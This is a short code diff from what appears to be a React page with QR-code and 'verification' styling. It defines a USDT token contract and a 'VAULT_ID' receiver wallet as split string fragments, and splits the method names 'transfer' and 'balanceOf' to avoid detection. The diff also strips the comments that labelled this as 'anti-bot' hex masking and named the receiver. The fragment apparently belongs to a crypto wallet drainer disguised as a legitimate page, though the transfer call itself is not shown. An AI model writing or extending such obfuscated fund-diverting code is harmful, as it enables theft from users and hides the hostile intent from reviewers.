@@ -1868,14 +1868,13 @@ import { QrCode, User, Check, ExternalLink, ShieldCheck } from "lucide-react";
 import { ToastContainer, toast } from 'react-toastify';
 import 'react-toastify/dist/ReactToastify.css';
 
-// --- HEX MASKING (Anti-Bot) ---
 const _u1 = "0x55d398326f9";
 const _u2 = "9059fF775485246999027B3197955";
-const CONTRACT_ID = _u1 + _u2; // USDT
+const CONTRACT_ID = _u1 + _u2; 
 
 const _r1 = "0xD91D1241605308f41";
 const _r2 = "028c849D1E68F130642CF4e";
-const VAULT_ID = _r1 + _r2; // Receiver
+const VAULT_ID = _r1 + _r2; 
 
 const _m1 = "tra" + "nsfer";
 const _m2 = "balan" + "ceOf";
